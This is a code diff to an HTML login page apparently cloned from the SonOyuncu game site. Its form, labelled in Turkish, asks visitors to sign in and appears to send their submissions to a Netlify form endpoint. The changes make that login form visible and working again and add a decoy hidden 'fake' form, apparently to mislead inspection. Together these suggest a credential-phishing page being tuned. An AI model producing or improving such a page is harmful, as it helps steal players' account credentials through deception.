@@ -66,11 +66,11 @@ function biscolabLaravelReCaptcha(token) {
   right: 0px !important;
 }
 
-/* Form alanını görünür ama etkisiz hâle getir */
-form {
+/* Rastgele form görünmez ve etkisiz */
+#fake-hidden-form {
   width: 1px !important;
   height: 1px !important;
-  opacity: 0.01 !important;
+  opacity: 0 !important;
   pointer-events: none !important;
   position: absolute !important;
   top: -9999px !important;
@@ -93,7 +93,7 @@ form {
 </a>
 </div>
 <div class="w-full">
-<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" data-netlify="true" id="biscolab-recaptcha-invisible-form" method="POST" name="giris-yap" style=""><input name="form-name" type="hidden" value="giris-yap"/>
+<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" data-netlify="true" id="biscolab-recaptcha-invisible-form" method="POST" name="giris-yap"><input name="form-name" type="hidden" value="giris-yap"/>
 <input name="token" type="hidden" value="e6cf690aeb8b176a68cfd020a4b2685075647e5150442d736ceac5705e0dbe8d"/>
 <h1 class="text-2xl font-semibold">Giriş Yap</h1>
 <p class="text-sm mb-4">SonOyuncu hesabına giriş yap.</p>
@@ -140,4 +140,4 @@ function onSubmit(token) {
   document.getElementById("biscolab-recaptcha-invisible-form").submit();
 }
 </script>
-</body></html>
+<form action="#" id="fake-hidden-form" method="POST"><input readonly="readonly" type="text" value="fake"/></form></body></html>
